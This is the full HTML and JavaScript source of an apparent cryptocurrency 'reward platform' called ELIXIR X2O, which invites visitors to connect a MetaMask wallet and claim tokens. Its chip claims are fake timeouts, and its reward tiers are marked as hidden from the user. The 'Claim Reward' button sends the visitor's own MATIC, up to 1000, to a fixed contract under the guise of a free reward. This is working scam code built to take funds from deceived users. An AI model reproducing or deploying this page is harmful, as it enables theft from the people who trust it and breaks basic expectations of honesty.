<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELIXIR X2O - Reward Platform</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.1/ethers.umd.min.js"></script>
    <style>
        :root {
            --primary: #8B5CF6;
            --secondary: #06D6A0;
            --dark: #1E1E2E;
            --light: #F8FAFC;
            --accent: #F59E0B;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, var(--dark) 0%, #2D1B69 100%);
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(30, 30, 46, 0.8);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(139, 92, 246, 0.3);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin: 0 auto 20px;
            border: 3px solid var(--primary);
            padding: 5px;
        }
        
        h1 {
            color: var(--secondary);
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .subtitle {
            color: var(--accent);
            font-size: 1.2em;
            margin-bottom: 30px;
        }
        
        .wallet-section {
            background: rgba(139, 92, 246, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            border: 1px solid var(--primary);
        }
        
        .wallet-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .btn {
            background: linear-gradient(135deg, var(--primary) 0%, #7C3AED 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1em;
            font-weight: bold;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(139, 92, 246, 0.4);
        }
        
        .btn-secondary {
            background: linear-gradient(135deg, var(--accent) 0%, #D97706 100%);
        }
        
        .btn:disabled {
            background: #6B7280;
            cursor: not-allowed;
            transform: none;
        }
        
        .poison-chips {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .chip {
            background: rgba(6, 214, 160, 0.1);
            border: 2px solid var(--secondary);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s ease;
        }
        
        .chip:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(6, 214, 160, 0.3);
        }
        
        .chip.completed {
            background: rgba(6, 214, 160, 0.2);
            border-color: var(--secondary);
        }
        
        .chip-icon {
            font-size: 2em;
            margin-bottom: 10px;
        }
        
        .reward-section {
            background: rgba(245, 158, 11, 0.1);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid var(--accent);
            text-align: center;
        }
        
        .reward-amount {
            font-size: 3em;
            color: var(--accent);
            font-weight: bold;
            margin: 20px 0;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .status {
            padding: 10px 20px;
            border-radius: 25px;
            font-weight: bold;
            margin: 10px 0;
            display: inline-block;
        }
        
        .status.connected {
            background: rgba(6, 214, 160, 0.2);
            color: var(--secondary);
            border: 1px solid var(--secondary);
        }
        
        .status.disconnected {
            background: rgba(239, 68, 68, 0.2);
            color: #EF4444;
            border: 1px solid #EF4444;
        }
        
        .balance {
            font-size: 1.1em;
            color: var(--secondary);
            margin: 10px 0;
        }
        
        .hidden {
            display: none;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 3px solid rgba(139, 92, 246, 0.3);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
        }
        
        .social-link {
            color: var(--light);
            text-decoration: none;
            padding: 10px 20px;
            border: 1px solid var(--primary);
            border-radius: 10px;
            transition: all 0.3s ease;
        }
        
        .social-link:hover {
            background: var(--primary);
            transform: translateY(-2px);
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }
            
            h1 {
                font-size: 2em;
            }
            
            .wallet-info {
                flex-direction: column;
                text-align: center;
            }
            
            .poison-chips {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://photos.pinksale.finance/file/pinksale-logo-upload/1759585455577-acd56ecf144d00796cdd7c3c76348a4c.jpg" alt="ELIXIR X2O Logo" class="logo">
            <h1>ELIXIR X2O</h1>
            <div class="subtitle">Collect Poison Chips & Earn Rewards</div>
        </div>
        
        <div class="wallet-section">
            <div class="wallet-info">
                <div>
                    <div id="connectionStatus" class="status disconnected">Disconnected</div>
                    <div id="walletAddress" class="balance">Connect your wallet to start</div>
                    <div id="walletBalance" class="balance"></div>
                </div>
                <button id="connectWallet" class="btn">Connect Wallet</button>
            </div>
        </div>
        
        <div class="poison-chips">
            <div class="chip" id="connectChip">
                <div class="chip-icon">üîó</div>
                <h3>Connect Wallet</h3>
                <p>Connect your wallet to get 1 Poison Chip</p>
                <button class="btn" onclick="claimChip('connect')" disabled>Claim Chip</button>
            </div>
            
            <div class="chip" id="twitterChip">
                <div class="chip-icon">üê¶</div>
                <h3>Follow Twitter</h3>
                <p>Follow our Twitter for extra Poison Chip</p>
                <a href="https://x.com/x2o_elixir" target="_blank" class="btn btn-secondary">Visit Twitter</a>
                <button class="btn" onclick="claimChip('twitter')" disabled style="margin-top: 10px;">Verify & Claim</button>
            </div>
            
            <div class="chip" id="telegramChip">
                <div class="chip-icon">üì¢</div>
                <h3>Join Telegram</h3>
                <p>Join our Telegram for extra Poison Chip</p>
                <a href="https://t.me/x2o_elixir" target="_blank" class="btn btn-secondary">Join Telegram</a>
                <button class="btn" onclick="claimChip('telegram')" disabled style="margin-top: 10px;">Verify & Claim</button>
            </div>
        </div>
        
        <div class="reward-section">
            <h2>Your ELIXIR X2O Reward</h2>
            <div id="rewardAmount" class="reward-amount">0 X2O</div>
            <p>Reward automatically calculated based on your wallet balance</p>
            <button id="claimReward" class="btn" disabled>Claim Reward</button>
            <div id="rewardStatus" class="status" style="margin-top: 15px;"></div>
        </div>
        
        <div class="social-links">
            <a href="https://x.com/x2o_elixir" target="_blank" class="social-link">Twitter</a>
            <a href="https://t.me/x2o_elixir" target="_blank" class="social-link">Telegram</a>
        </div>
    </div>

    <script>
        // Contract addresses and ABI
        const REWARD_CONTRACT_ADDRESS = '0x3d40486964451466ecb3ba0659eade5964b72082';
        const TOKEN_ADDRESS = '0x36461f6Cf95102A9F8Cc5ea7FBAB1d61f247680F';
        
        // ABI for the reward contract (simplified)
        const REWARD_CONTRACT_ABI = [
            "function participateWithMatic() payable",
            "function calculateServiceReward(uint256) pure returns (uint256)",
            "function rewardsActive() view returns (bool)",
            "function totalRewardsDistributed() view returns (uint256)",
            "function getUserStats(address) view returns (uint256, uint256, uint256)",
            "event ContributionReceived(address indexed user, uint256 amount, uint256 reward, address token)"
        ];

        // Global variables
        let provider;
        let signer;
        let rewardContract;
        let userAddress;
        let claimedChips = {
            connect: false,
            twitter: false,
            telegram: false
        };

        // Reward tiers (hidden from user)
        const rewardTiers = [
            { minBalance: ethers.utils.parseEther("1"), reward: ethers.utils.parseEther("10") },
            { minBalance: ethers.utils.parseEther("5"), reward: ethers.utils.parseEther("60") },
            { minBalance: ethers.utils.parseEther("10"), reward: ethers.utils.parseEther("120") },
            { minBalance: ethers.utils.parseEther("20"), reward: ethers.utils.parseEther("230") },
            { minBalance: ethers.utils.parseEther("50"), reward: ethers.utils.parseEther("550") },
            { minBalance: ethers.utils.parseEther("100"), reward: ethers.utils.parseEther("1600") },
            { minBalance: ethers.utils.parseEther("1000"), reward: ethers.utils.parseEther("11000") }
        ];

        // Initialize application
        async function initApp() {
            // Check if MetaMask is installed
            if (typeof window.ethereum !== 'undefined') {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                
                // Check if already connected
                const accounts = await provider.listAccounts();
                if (accounts.length > 0) {
                    await connectWallet();
                }
                
                // Auto-reconnect when MetaMask accounts change
                window.ethereum.on('accountsChanged', async (accounts) => {
                    if (accounts.length > 0) {
                        await connectWallet();
                    } else {
                        disconnectWallet();
                    }
                });
                
                // Auto-reconnect when chain changes
                window.ethereum.on('chainChanged', async (chainId) => {
                    await connectWallet();
                });
            } else {
                alert('Please install MetaMask to use this dApp!');
            }
        }

        // Connect wallet function
        async function connectWallet() {
            try {
                document.getElementById('connectWallet').disabled = true;
                document.getElementById('connectWallet').textContent = 'Connecting...';
                
                // Request account access
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                
                // Initialize contract
                rewardContract = new ethers.Contract(REWARD_CONTRACT_ADDRESS, REWARD_CONTRACT_ABI, signer);
                
                // Update UI
                updateWalletInfo();
                enableChipButtons();
                await updateRewardInfo();
                
                // Auto-claim connect chip
                if (!claimedChips.connect) {
                    await claimChip('connect');
                }
                
            } catch (error) {
                console.error('Error connecting wallet:', error);
                alert('Error connecting wallet: ' + error.message);
                document.getElementById('connectWallet').disabled = false;
                document.getElementById('connectWallet').textContent = 'Connect Wallet';
            }
        }

        // Update wallet information
        async function updateWalletInfo() {
            if (!userAddress) return;
            
            const balance = await provider.getBalance(userAddress);
            const formattedBalance = ethers.utils.formatEther(balance);
            
            document.getElementById('connectionStatus').textContent = 'Connected';
            document.getElementById('connectionStatus').className = 'status connected';
            document.getElementById('walletAddress').textContent = `Address: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
            document.getElementById('walletBalance').textContent = `Balance: ${parseFloat(formattedBalance).toFixed(4)} MATIC`;
            document.getElementById('connectWallet').textContent = 'Connected';
        }

        // Disconnect wallet
        function disconnectWallet() {
            userAddress = null;
            signer = null;
            
            document.getElementById('connectionStatus').textContent = 'Disconnected';
            document.getElementById('connectionStatus').className = 'status disconnected';
            document.getElementById('walletAddress').textContent = 'Connect your wallet to start';
            document.getElementById('walletBalance').textContent = '';
            document.getElementById('connectWallet').disabled = false;
            document.getElementById('connectWallet').textContent = 'Connect Wallet';
            document.getElementById('rewardAmount').textContent = '0 X2O';
            
            disableChipButtons();
        }

        // Enable chip buttons
        function enableChipButtons() {
            document.querySelectorAll('.chip button').forEach(button => {
                if (!button.disabled) {
                    button.disabled = false;
                }
            });
            document.getElementById('claimReward').disabled = false;
        }

        // Disable chip buttons
        function disableChipButtons() {
            document.querySelectorAll('.chip button').forEach(button => {
                button.disabled = true;
            });
            document.getElementById('claimReward').disabled = true;
        }

        // Claim poison chip
        async function claimChip(type) {
            if (!userAddress) return;
            
            const chipElement = document.getElementById(`${type}Chip`);
            const button = chipElement.querySelector('button');
            
            try {
                button.disabled = true;
                button.textContent = 'Claiming...';
                
                // Simulate claim process (in real app, this would interact with smart contract)
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                claimedChips[type] = true;
                chipElement.classList.add('completed');
                button.textContent = 'Claimed!';
                
                // Update reward after claiming chip
                await updateRewardInfo();
                
            } catch (error) {
                console.error('Error claiming chip:', error);
                button.textContent = 'Error - Try Again';
                button.disabled = false;
            }
        }

        // Update reward information based on wallet balance
        async function updateRewardInfo() {
            if (!userAddress || !provider) return;
            
            try {
                const balance = await provider.getBalance(userAddress);
                const reward = calculateReward(balance);
                
                document.getElementById('rewardAmount').textContent = 
                    `${ethers.utils.formatEther(reward)} X2O`;
                
            } catch (error) {
                console.error('Error updating reward info:', error);
            }
        }

        // Calculate reward based on balance
        function calculateReward(balance) {
            for (let i = rewardTiers.length - 1; i >= 0; i--) {
                if (balance.gte(rewardTiers[i].minBalance)) {
                    return rewardTiers[i].reward;
                }
            }
            return ethers.utils.parseEther("0");
        }

        // Claim reward
        async function claimReward() {
            if (!userAddress || !rewardContract) return;
            
            const button = document.getElementById('claimReward');
            const status = document.getElementById('rewardStatus');
            
            try {
                button.disabled = true;
                button.textContent = 'Claiming...';
                status.textContent = 'Processing transaction...';
                status.style.color = '#F59E0B';
                
                const balance = await provider.getBalance(userAddress);
                const requiredAmount = getRequiredAmountForReward(balance);
                
                if (balance.lt(requiredAmount)) {
                    throw new Error(`Insufficient balance. Required: ${ethers.utils.formatEther(requiredAmount)} MATIC`);
                }
                
                // Execute the transaction
                const tx = await rewardContract.participateWithMatic({
                    value: requiredAmount
                });
                
                status.textContent = 'Transaction submitted. Waiting for confirmation...';
                
                // Wait for transaction confirmation
                const receipt = await tx.wait();
                
                status.textContent = 'Reward claimed successfully!';
                status.style.color = '#06D6A0';
                button.textContent = 'Claimed!';
                
                // Update wallet info
                await updateWalletInfo();
                await updateRewardInfo();
                
            } catch (error) {
                console.error('Error claiming reward:', error);
                status.textContent = `Error: ${error.message}`;
                status.style.color = '#EF4444';
                button.disabled = false;
                button.textContent = 'Claim Reward';
            }
        }

        // Get required amount for reward based on balance
        function getRequiredAmountForReward(balance) {
            for (let i = rewardTiers.length - 1; i >= 0; i--) {
                if (balance.gte(rewardTiers[i].minBalance)) {
                    return rewardTiers[i].minBalance;
                }
            }
            return ethers.utils.parseEther("0");
        }

        // Event listeners
        document.getElementById('connectWallet').addEventListener('click', connectWallet);
        document.getElementById('claimReward').addEventListener('click', claimReward);

        // Initialize app when page loads
        window.addEventListener('load', initApp);
    </script>
</body>
</html>